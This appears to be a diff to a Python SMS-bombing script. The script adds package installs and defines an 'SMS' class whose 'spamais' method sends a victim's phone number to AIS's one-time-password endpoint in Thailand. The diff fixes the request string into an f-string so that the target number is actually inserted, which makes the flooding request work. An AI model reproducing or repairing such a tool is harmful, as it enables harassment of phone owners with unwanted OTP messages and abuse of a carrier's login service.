@@ -5,6 +5,10 @@ from colorama import Fore, Style, init
 #from requests_futures.sessions import FuturesSession
 #from requests_futures import 
 os.system("pkg install toilet")
+os.system ("sudo apt install toilet")
+os.system ("sudo apt install ruby")
+os.system ("gem install lolcat")
+os.system ("sudo apt install toilet figlet")
 os.system("pkg install ruby")
 os.system("gem install lolcat")
 os.system("pkg install python")
@@ -21,7 +25,7 @@ num = int("" + number)
 class SMS():
     def spamais(self,num):
         url = "https://srfng.ais.co.th/login/sendOneTimePW"
-        data ="msisdn={num}&serviceId=AISPlay&accountType=all&otpChannel=sms"
+        data =f"msisdn={num}&serviceId=AISPlay&accountType=all&otpChannel=sms"
         headers = {
                     "Host": "srfng.ais.co.th",
                     "Connection": "keep-alive",
